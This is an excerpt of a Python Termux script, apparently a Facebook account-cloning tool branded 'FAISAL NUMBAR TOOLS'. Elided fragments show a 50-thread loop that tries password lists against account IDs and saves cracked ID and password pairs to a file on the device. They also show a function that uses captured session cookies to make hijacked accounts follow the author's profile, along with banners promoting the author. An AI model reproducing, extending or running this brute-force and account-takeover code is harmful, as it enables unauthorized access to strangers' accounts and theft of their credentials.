...
def ud():
    ...
    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m JOIN MY 1st Profile')
    ...
    if opt == 'A':
        ...
        os.system('xdg-open https://www.facebook.com/username.ir.4')
...
def ND():
    ...
    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m JOIN MY 2nd profile')
    ...
    if opt == 'A':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100093183693497')
...
def o():
    ...
    jalan('\t   \033[38;5;192m👾FAISAL NUMBAR TOOLS👾')
    ...
    jalan(' \033[38;5;196m[\033[38;5;195mC\033[38;5;196m]\033[38;5;46m JOIN MY 1st PROFILE')

    jalan(' \033[38;5;196m[\033[38;5;195mD\033[38;5;196m]\033[38;5;46m JOIN MY 2nd PROFILE')
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100093183693497', {
...
logo =                                          ("""   
 ...
 \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mMUHAM FAISAL   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      :  \033[1;34mFAISAL                \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mFAISAL                \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mMFS                   \033[1;93m|
 ...
 \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m FAISAL TERMUX HELPING ZONE....
 \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××\n""")
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(' \033[38;5;45mHARIS-A \033[38;5;46m/ \033[38;5;45mFAISAL-S\033[38;5;45m We Are Brother💚')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print( ' \033[38;5;196m[FAISAL-CP💔]  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/FAISAL-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[FAISAL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
